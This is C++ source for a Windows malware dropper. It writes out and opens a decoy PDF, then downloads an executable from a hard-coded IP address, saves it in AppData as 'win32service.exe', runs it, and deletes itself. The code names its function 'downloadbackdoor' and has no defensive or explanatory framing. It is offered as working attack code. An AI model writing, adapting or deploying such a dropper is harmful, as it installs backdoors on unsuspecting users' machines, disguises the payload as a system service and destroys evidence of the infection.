#include <fstream>
#include <iostream>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <Windows.h>
#include <string>
#include <urlmon.h>
#include <filesystem>
#pragma comment(lib, "urlmon.lib")
using namespace std;

//https://tomeko.net/online_tools/file_to_hex.php?lang=en
unsigned char pdfData[] = {

};
size_t pdfDataSize = sizeof(pdfData) / sizeof(pdfData[0]);

void createPDF(std::string filePath) {
    std::ofstream outFile(filePath, std::ios::out | std::ios::binary);
    if (!outFile) return;
    outFile.write(reinterpret_cast<const char*>(pdfData), pdfDataSize);
    outFile.close();
}

string getTempPath() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    return std::string(tempPath);
}

void openPDFNonBlocking(const std::string& filePath) {
    std::string command = "start " + filePath;
    std::system(command.c_str());
}

void downloadbackdoor() {
    char* appDataCStr;
    size_t len;
    _dupenv_s(&appDataCStr, &len, "AppData");
    std::string appData = appDataCStr;
    free(appDataCStr);
    std::string filePath = appData + "\\Windows Service\\";
    std::filesystem::create_directories(filePath);
    string URL = "http://98.70.78.176:8000/extra.exe";
    string Backdoorpath = filePath + "win32service.exe";
    wstring tempUrl = wstring(URL.begin(), URL.end());
    wstring tempBackdoorpath = wstring(Backdoorpath.begin(), Backdoorpath.end());
    LPCWSTR url = tempUrl.c_str();
    LPCWSTR backdoorpath = tempBackdoorpath.c_str();
    if (S_OK == URLDownloadToFile(NULL, url, backdoorpath, 0, NULL))
        ShellExecute(NULL, L"open", backdoorpath, NULL, NULL, SW_SHOWNORMAL);
}

int main(int argc, char* argv[]) {
    createPDF("output.pdf");
    openPDFNonBlocking("output.pdf");
    downloadbackdoor();
    //self destruction
    char* process_name = argv[0];
    char command[256] = "start /min cmd /c del ";
    strcat_s(command, sizeof(command), process_name);
    system(command);
    return 0;
}
